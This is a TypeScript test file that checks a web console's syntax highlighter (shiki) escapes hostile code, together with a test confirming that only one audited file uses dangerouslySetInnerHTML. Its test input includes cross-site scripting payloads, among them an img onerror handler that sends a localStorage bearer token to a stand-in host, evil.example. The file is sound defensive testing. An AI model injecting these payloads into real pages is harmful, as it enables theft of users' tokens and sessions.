/**
 * The one `dangerouslySetInnerHTML` in the console (web/src/components/ui/code-block.tsx) is fed by
 * shiki's `codeToHtml`. Everything it renders — agent output, repo files, tool results, a fetched web
 * page — is untrusted by our own threat model, and the page holds a root-equivalent bearer token in
 * localStorage. So this asserts the property the sink depends on: shiki emits ONLY its own markup and
 * escapes the code, so hostile source can never open a tag or add an event-handler attribute.
 *
 * shiki is a web-workspace dependency; skip (rather than fail) when web deps aren't installed.
 */
import { test } from "node:test";
import assert from "node:assert/strict";
import { createRequire } from "node:module";
import { pathToFileURL } from "node:url";
import { existsSync } from "node:fs";
import { execFileSync } from "node:child_process";
import { dirname, join, resolve } from "node:path";
import { fileURLToPath } from "node:url";

const HERE = dirname(fileURLToPath(import.meta.url));
const WEB_PKG = resolve(HERE, "..", "web", "package.json");
const HAS_WEB_DEPS = existsSync(resolve(HERE, "..", "web", "node_modules", "shiki"));

// Payloads that break a naive highlighter: tag injection, an event-handler attribute that would
// exfiltrate the token, and an attribute-context break.
const HOSTILE = [
  `<script>alert(document.domain)</script>`,
  `<img src=x onerror="fetch('//evil.example/'+localStorage.getItem('asb-token'))">`,
  `"><svg onload=alert(1)>`,
  `</code></pre><iframe src=//evil.example>`,
  `&<>'"`,
].join("\n");

// shiki's own markup: <pre>/<code>/<span> carrying only class, style and tabindex.
const ALLOWED_TAG = /^<\/?(pre|code|span)(\s+(class|style|tabindex)="[^"]*")*\s*>$/;

test("shiki escapes hostile code and emits only its own inert markup", { skip: !HAS_WEB_DEPS && "web deps not installed" }, async () => {
  const req = createRequire(pathToFileURL(WEB_PKG));
  const { createHighlighterCore } = await import(pathToFileURL(req.resolve("shiki/core")).href);
  const { createJavaScriptRegexEngine } = await import(pathToFileURL(req.resolve("shiki/engine/javascript")).href);
  const dark = await import(pathToFileURL(req.resolve("shiki/themes/github-dark.mjs")).href);
  const bash = await import(pathToFileURL(req.resolve("shiki/langs/bash.mjs")).href);

  const hl = await createHighlighterCore({
    themes: [dark.default],
    langs: [bash.default],
    engine: createJavaScriptRegexEngine(),
  });

  // Both the highlighted path and the plaintext fallback the component uses for unknown grammars.
  for (const lang of ["bash", "text"]) {
    const html: string = hl.codeToHtml(HOSTILE, { lang, theme: "github-dark" });

    // 1. No tag from the payload survives as markup.
    assert.ok(!/<\s*(script|img|svg|iframe)/i.test(html), `[${lang}] payload opened a tag`);
    // 2. The '<' characters are actually escaped, not silently dropped. (The grammar may split the
    //    payload across spans — `&#x3C;</span><span…>script` — so assert on the entity, not a phrase.)
    assert.ok(html.includes("&#x3C;"), `[${lang}] expected escaped < in the output`);
    assert.ok(html.includes("&#x26;"), `[${lang}] expected escaped & in the output`);
    // 3. Strongest form: EVERY tag in the output is shiki's own, with an inert attribute set. This is
    //    what rules out an injected event handler regardless of which payload shape is used.
    for (const tag of html.match(/<[^>]*>/g) ?? []) {
      assert.match(tag, ALLOWED_TAG, `[${lang}] unexpected tag in highlighter output: ${tag}`);
    }
  }
});

test("the sinks are exactly the audited ones", () => {
  // Both sinks render shiki's `codeToHtml` output and nothing else: code-block for markdown fences and
  // traces, JsonEditor for the MCP config the operator types (highlightHtml in code-block.tsx). If a
  // third appears, it needs its own audit — fail loudly here.
  const webSrc = resolve(HERE, "..", "web", "src");
  let out = "";
  try {
    out = execFileSync("grep", ["-rl", "dangerouslySetInnerHTML", webSrc], { encoding: "utf8" });
  } catch {
    out = ""; // grep exits 1 on no matches
  }
  const files = out.split("\n").filter(Boolean).map((f) => f.replace(`${webSrc}/`, ""));
  assert.deepEqual(files.sort(), ["components/ui/code-block.tsx"]);
});
